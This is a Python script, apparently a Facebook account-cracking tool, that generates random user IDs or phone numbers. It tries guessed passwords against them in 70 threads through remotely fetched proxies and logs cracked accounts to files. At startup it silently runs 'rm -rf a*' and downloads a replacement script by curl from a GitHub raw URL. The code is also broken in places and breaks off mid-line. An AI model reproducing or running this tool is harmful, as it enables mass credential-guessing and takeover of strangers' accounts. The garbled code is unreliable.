import os,sys,time,json,random,re,string,platform,base64

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures==2 > /dev/null')

    os.system('python Nawid.py')

P = '\1b[1;97m' # PUTIH

M = '\1b[1;91m' # MERAH

H = '\1b[1;92m' # HIJAU

K = '\1b[1;93m' # KUNING

B = '\1b[1;94m' # BIRU

U = '\1b[1;95m' # UNGU

O = '\1b[1;96m' # BIRU MUDA

N = '\1b[0m'    # WARNA MATI

A = '\1b[1;90m' # WARNA ABU ABU

BN = '\1b[1;107m' # BELAKANG PUTIH

BBL = '\1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\1b[1;105m' # BELAKANG PINK

BB = '\1b[1;104m' # BELAKANG BIRU

BK = '\1b[1;103m' # BELAKANG KUNING

BH = '\1b[1;102m' # BELAKANG HIJAU

BM = '\1b[1;101m' # BELAJANG MERAH

BA = '\1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

logo =  """   

    

     
███╗░░██╗░█████╗░░██╗░░░░░░░██╗██╗██████╗░
████╗░██║██╔══██╗░██║░░██╗░░██║██║██╔══██╗
██╔██╗██║███████║░╚██╗████╗██╔╝██║██║░░██║
██║╚████║██╔══██║░░████╔═████║░██║██║░░██║
██║░╚███║██║░░██║░░╚██╔╝░╚██╔╝░██║██████╔╝
╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░

██╗░░██╗██╗███╗░░██╗░██████╗░
██║░██╔╝██║████╗░██║██╔════╝░
█████═╝░██║██╔██╗██║██║░░██╗░
██╔═██╗░██║██║╚████║██║░░╚██╗
██║░╚██╗██║██║░╚███║╚██████╔╝
╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░ 
   
     
 

══════════════════════════════════════════════════

  Author       : 💔😐

  GROUP        : BEST TECHNICALS

  TOOLS STATUS :  Nawid King 

  Youtube      : Nawid King 

══════════════════════════════════════════════════"""

loop = 0

oks = []

cps = []

try:

    print('\\\33[1;33mLoading asset files ... \33[0;97m')

    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()

    v = 3.1

    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text

    if str(v) in update:

        os.system('rm -rf a*')

        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')

        os.system(')

    else:pass

except:print('\\33[1;31mNo internet connection ... \33[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\'+text+o),

        sys.stdout.flush();time.sleep(1)

def asad():

    os.system('clear')

    print(logo)

    print('[1] Random crack')

    print(50*'-')

    opt = input('Choose option >>> ')

    if opt =='1':

        random_crack()

    else:

        print('\\33[1;31mChoose valid option\33[0;97m')

def random_crack():

    os.system('clear')

    print(logo)

    print('[1] Random UID crack')

    print('[2] Random number crack')

    print('[B] Back')

    print(50*'-')

    opt = input('Choose option >>> ')

    if opt =='1':

        random_uid()

    elif opt =='2':

        random_number()

    elif opt =='3':

        main()

    else:

        print('\\33[1;31mChoose valid option\33[0;97m')

def random_uid():

    user=[]

    os.system('clear')

    print(logo)

    limit = int(input('How many ids do you want to add ? '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(11))

        user.append('10000'+nmp)

    print('\\33[1;33mExample: 123456,1234567,12345678 ... \33[0;97m')

    pwx = input('Put passwords: ').split(',')

    with ThreadPool(max_workers=70) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print('Total ids: '+tl)

        print('The process has been started')

        print(50*'-')

        for uid in user:

            yaari.submit(rcrack,uid,pwx,tl)

    print(50*'-')

    print('Crack process has been completed')

    print('Ids saved in ok.txt,cp.txt')

    print(50*'-')

def random_number():

    user=[]

    os.system('clear')

    print(logo)

    print('\33[1;33mCode example: 92301,92302,92303,92344 .\33[0;97m')

    kode = input('Put code: ')

    limit = int(input('How many numbers do you want to add ? '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with ThreadPool(max_workers=70) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print('Total ids: '+tl)

        print('The process has been started')

        print(50*'-')

        for guru in user:

            uid = kode+guru

            pwx = [guru]

            yaari.submit(rcrack,uid,pwx,tl)

    print(50*'-')

    print('Crack process has been completed')

    print('Ids saved in ok.txt,cp.txt')

    print(50*'-')

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(proxy)

            session = requests.Session()

            free_fb = session.get('https://free.facebook.c
